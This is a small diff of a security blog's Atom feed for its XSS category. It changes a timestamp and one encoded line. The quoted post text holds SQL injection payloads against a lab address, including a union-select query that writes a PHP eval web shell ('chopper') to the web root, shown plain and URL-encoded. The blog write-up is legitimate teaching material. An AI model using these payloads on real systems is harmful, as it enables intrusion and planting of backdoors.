@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Xss | F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/blog/categories/xss/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2015-05-09T07:30:01-04:00</updated>
+  <updated>2015-05-09T08:07:47-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -141,7 +141,7 @@ http://192.168.1.149/admin/edit.php?id=-2 union select 1,@@version,user(),4
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2">http://192.168.1.149/admin/edit.php?id=-2&lt;/a> union select 1,2,&ldquo;&lt;?php @eval($_POST[&lsquo;chopper&rsquo;])?>&rdquo;,4 into outfile &ldquo;/var/www/css/t2.php&rdquo; — –</span></code></pre></td></tr></table></div></figure>
 attacking code(URL encoded)：
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-">http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e">http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e&lt;/a></span></code></pre></td></tr></table></div></figure></p>
 ]]></content>
   </entry>
   
